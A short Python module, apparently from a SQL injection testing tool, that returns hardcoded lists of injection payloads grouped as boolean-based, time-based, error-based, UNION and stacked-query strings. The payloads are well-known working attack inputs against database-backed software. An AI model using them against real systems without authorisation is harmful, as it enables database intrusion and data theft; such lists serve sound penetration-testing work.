"""
Payload loader module
"""

import os

class PayloadLoader:
    """Load SQL injection payloads from files"""
    
    def __init__(self):
        self.payload_dir = os.path.join(os.path.dirname(__file__))
    
    def load_boolean(self):
        """Load boolean-based blind payloads"""
        return self._load_payloads('boolean.txt')
    
    def load_time_based(self):
        """Load time-based blind payloads"""
        return self._load_payloads('time_based.txt')
    
    def load_error_based(self):
        """Load error-based payloads"""
        return self._load_payloads('error_based.txt')
    
    def load_union(self):
        """Load UNION payloads"""
        return self._load_payloads('union.txt')
    
    def load_stacked(self):
        """Load stacked queries payloads"""
        return self._load_payloads('stacked.txt')
    
    def _load_payloads(self, filename):
        """Load payloads from file"""
        filepath = os.path.join(self.payload_dir, filename)
        
        
        
        if 'boolean' in filename:
            return [
                "' OR '1'='1",
                "' OR '1'='1' -- ",
                "' OR '1'='1' #",
                "' OR 1=1 -- ",
                "' OR 1=1#"
            ]
        elif 'time' in filename:
            return [
                "' AND SLEEP(5) -- ",
                "' AND pg_sleep(5) -- ",
                "' AND WAITFOR DELAY '00:00:05' -- "
            ]
        elif 'error' in filename:
            return [
                "' AND 1=CONVERT(int, @@version) -- ",
                "' AND 1=1 UNION SELECT 1,@@version,3 -- ",
                "' OR 1=1 AND 1=CONVERT(int, @@version) -- "
            ]
        elif 'union' in filename:
            return [
                "' UNION SELECT NULL -- ",
                "' UNION SELECT NULL, NULL -- ",
                "' UNION SELECT 1,2,3 -- "
            ]
        elif 'stacked' in filename:
            return [
                "'; SELECT 1 -- ",
                "'; SELECT 1; -- ",
                "'||(SELECT 1)-- "
            ]
        
        return []
